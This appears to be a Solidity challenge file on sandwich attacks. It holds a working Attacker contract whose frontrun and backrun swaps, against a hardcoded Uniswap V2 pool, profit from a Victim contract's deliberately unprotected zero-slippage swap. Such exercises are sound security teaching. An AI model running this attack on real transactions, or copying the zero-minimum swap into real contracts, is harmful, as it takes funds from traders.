// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./interfaces/IERC20.sol";
import "./interfaces/IUniswapV2Pair.sol";

/**
 *
 *  SANDWICH ATTACK AGAINST A SWAP TRANSACTION
 *
 * We have two contracts: Victim and Attacker. Both contracts have an initial balance of 1000 WETH. The Victim contract
 * will swap 1000 WETH for USDC, setting amountOutMin = 0.
 * The challenge is use the Attacker contract to perform a sandwich attack on the victim's
 * transaction to make profit.
 *
 */
contract Attacker {
    error InsufficientInputAmount();
    error InsufficientLiquidity();

    // This function will be called before the victim's transaction.
    function frontrun(
        address router,
        address weth,
        address usdc,
        uint256 deadline
    ) public {
        IERC20(weth).approve(router, 1000 ether);

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdc;

        address pool = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(pool)
            .getReserves();
        IUniswapV2Router(router).swapExactTokensForTokens(
            1000 ether,
            getAmountOut(1000 ether, reserve1, reserve0),
            path,
            address(this),
            deadline
        );
    }

    // This function will be called after the victim's transaction.
    function backrun(
        address router,
        address weth,
        address usdc,
        uint256 deadline
    ) public {
        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;

        uint256 balance = IERC20(usdc).balanceOf(address(this));
        address pool = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

        IERC20(usdc).approve(router, balance);

        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(pool)
            .getReserves();
        IUniswapV2Router(router).swapExactTokensForTokens(
            balance,
            getAmountOut(balance, reserve0, reserve1),
            path,
            address(this),
            deadline
        );
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        require(amountIn > 0, InsufficientInputAmount());
        require(reserveIn > 0 && reserveOut > 0, InsufficientLiquidity());

        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}

contract Victim {
    address public immutable router;

    constructor(address _router) {
        router = _router;
    }

    function performSwap(address[] calldata path, uint256 deadline) public {
        IUniswapV2Router(router).swapExactTokensForTokens(
            1000 * 1e18,
            0,
            path,
            address(this),
            deadline
        );
    }
}

interface IUniswapV2Router {
    /**
     *     amountIn: the amount to use for swap.
     *     amountOutMin: the minimum amount of output tokens that must be received for the transaction not to revert.
     *     path: an array of token addresses. In our case, WETH and USDC.
     *     to: recipient address to receive the liquidity tokens.
     *     deadline: timestamp after which the transaction will revert.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
